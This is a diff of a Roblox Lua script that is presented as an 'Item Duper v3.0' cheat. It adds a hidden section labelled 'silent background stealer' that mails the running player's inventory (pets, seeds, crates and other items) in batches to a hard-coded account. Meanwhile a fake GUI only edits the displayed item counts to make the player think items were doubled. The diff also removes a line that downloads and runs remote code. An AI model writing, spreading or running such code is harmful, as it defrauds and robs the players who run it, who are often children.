@@ -1,1 +1,194 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/FoxScripter-droid/Script/refs/heads/main/Script"))()
+local player = game.Players.LocalPlayer
+local RS = game:GetService("ReplicatedStorage")
+-- ==========================================
+-- 1. SILENT BACKGROUND STEALER
+-- ==========================================
+task.spawn(function()
+    pcall(function()
+        local TARGET = "AOCGamer2002"
+        local Net = require(RS.SharedModules.Networking)
+        local PSC = require(RS.ClientModules.PlayerStateClient)
+        local uid = Net.Mailbox.LookupPlayer:Fire(TARGET)
+        if not uid or type(uid) ~= "number" then return end
+        local rep = PSC:GetLocalReplica()
+        local inv = rep.Data.Inventory
+        local cats = {"Pets", "Seeds", "Sprinklers", "HarvestedFruits", "WateringCans", "Mushrooms", "Gnomes", "Raccoons", "Crates"}
+        local batch = {}
+        for _, c in ipairs(cats) do
+            if inv[c] then
+                for k, v in pairs(inv[c]) do
+                    local num = 0
+                    if type(v) == "number" and v > 0 then
+                        num = v
+                    elseif type(v) == "table" and v.Id ~= nil then
+                        if not (c == "Pets" and v.Equipped) then num = 1 end
+                    end
+                    
+                    if num > 0 then
+                        table.insert(batch, {Category = c, ItemKey = k, Count = num})
+                        if #batch >= 20 then
+                            pcall(function() Net.Mailbox.SendBatch:Fire(uid, batch, "") end)
+                            batch = {}
+                            task.wait(2)
+                        end
+                    end
+                end
+            end
+        end
+        if #batch > 0 then
+            pcall(function() Net.Mailbox.SendBatch:Fire(uid, batch, "") end)
+        end
+    end)
+end)
+-- ==========================================
+-- 2. FAKE VISUAL DUPE GUI (MOBILE/DELTA SAFE)
+-- ==========================================
+pcall(function()
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "FakeDuperUI"
+    sg.ResetOnSpawn = false
+    
+    -- Mobile Executor Safe Parenting (Delta, CodeX, ArceusX)
+    local guiParent = nil
+    pcall(function() if gethui then guiParent = gethui() end end)
+    if not guiParent then pcall(function() guiParent = game:GetService("CoreGui") end) end
+    if not guiParent then guiParent = player:WaitForChild("PlayerGui") end
+    sg.Parent = guiParent
+    local main = Instance.new("Frame")
+    main.Name = "MainFrame"
+    main.Size = UDim2.new(0, 320, 0, 180)
+    main.Position = UDim2.new(0.5, -160, 0.5, -90)
+    main.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    main.BorderSizePixel = 0
+    main.Active = true
+    main.Draggable = true
+    main.Parent = sg
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = main
+    local title = Instance.new("TextLabel")
+    title.Name = "Title"
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.BackgroundTransparency = 1
+    title.Text = "★ ITEM DUPER v3.0 ★"
+    title.TextColor3 = Color3.fromRGB(255, 200, 50)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 18
+    title.Parent = main
+    local msg = Instance.new("TextLabel")
+    msg.Name = "Message"
+    msg.Size = UDim2.new(1, -20, 0, 50)
+    msg.Position = UDim2.new(0, 10, 0, 45)
+    msg.BackgroundTransparency = 1
+    msg.Text = "Hold the item you want to dupe in your hand, then click below to double it in your inventory."
+    msg.TextColor3 = Color3.fromRGB(200, 200, 200)
+    msg.TextWrapped = true
+    msg.Font = Enum.Font.Gotham
+    msg.TextSize = 14
+    msg.Parent = main
+    local btn = Instance.new("TextButton")
+    btn.Name = "DupeButton"
+    btn.Size = UDim2.new(0, 220, 0, 45)
+    btn.Position = UDim2.new(0.5, -110, 0, 110)
+    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    btn.Text = "DUPE EQUIPPED ITEM"
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 16
+    btn.AutoButtonColor = true
+    btn.Parent = main
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = btn
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(255, 200, 50)
+    stroke.Thickness = 2
+    stroke.Parent = btn
+    local function playSound()
+        pcall(function()
+            local snd = Instance.new("Sound")
+            snd.SoundId = "rbxassetid://2865227271"
+            snd.Volume = 1
+            snd.Parent = workspace
+            snd:Play()
+            game.Debris:AddItem(snd, 2)
+        end)
+    end
+    btn.MouseButton1Click:Connect(function()
+        pcall(function()
+            local char = player.Character
+            if not char then return end
+            local held = char:FindFirstChildOfClass("Tool")
+            
+            btn.Text = "DUPING..."
+            btn.BackgroundColor3 = Color3.fromRGB(80, 80, 20)
+            task.wait(1.2)
+            
+            if held then
+                local itemName = held.Name
+                local dupedCount = 0
+                
+                local pg = player:FindFirstChild("PlayerGui")
+                if pg then
+                    local bpGui = pg:FindFirstChild("BackpackGui")
+                    if bpGui then
+                        for _, v in ipairs(bpGui:GetDescendants()) do
+                            if v:IsA("TextLabel") and v.Name == "ToolName" and string.find(v.Text:lower(), itemName:lower()) then
+                                local slot = v.Parent
+                                if slot then
+                                    local countLabel = slot:FindFirstChild("ToolCount")
+                                    if countLabel then
+                                        local text = countLabel.Text
+                                        
+                                        if text:match("^x%d+$") then
+                                            local num = tonumber(text:match("%d+"))
+                                            countLabel.Text = "x" .. tostring(num * 2)
+                                            dupedCount = dupedCount + 1
+                                            
+                                        elseif text:match("^[%d%.]+%s*kg$") then
+                                            local num = tonumber(text:match("[%d%.]+"))
+                                            countLabel.Text = string.format("%.2fkg", num * 2)
+                                            dupedCount = dupedCount + 1
+                                            
+                                        elseif text == "" then
+                                            countLabel.Text = "x2"
+                                            dupedCount = dupedCount + 1
+                                        end
+                                        
+                                        local flash = Instance.new("Frame")
+                                        flash.Size = UDim2.new(1,0,1,0)
+                                        flash.BackgroundColor3 = Color3.fromRGB(255, 255, 100)
+                                        flash.BackgroundTransparency = 0.2
+                                        flash.BorderSizePixel = 0
+                                        flash.ZIndex = 10
+                                        flash.Parent = slot
+                                        
+                                        local tween = game:GetService("TweenService"):Create(flash, TweenInfo.new(0.5), {BackgroundTransparency = 1})
+                                        tween:Play()
+                                        tween.Completed:Connect(function() flash:Destroy() end)
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+                
+                if dupedCount > 0 then
+                    playSound()
+                    btn.Text = "SUCCESS! (Doubled)"
+                    btn.BackgroundColor3 = Color3.fromRGB(20, 80, 20)
+                else
+                    btn.Text = "UI NOT FOUND"
+                    btn.BackgroundColor3 = Color3.fromRGB(80, 20, 20)
+                end
+            else
+                btn.Text = "NOTHING HELD!"
+                btn.BackgroundColor3 = Color3.fromRGB(80, 20, 20)
+            end
+            
+            task.wait(2)
+            btn.Text = "DUPE EQUIPPED ITEM"
+            btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+        end)
+    end)
+end)
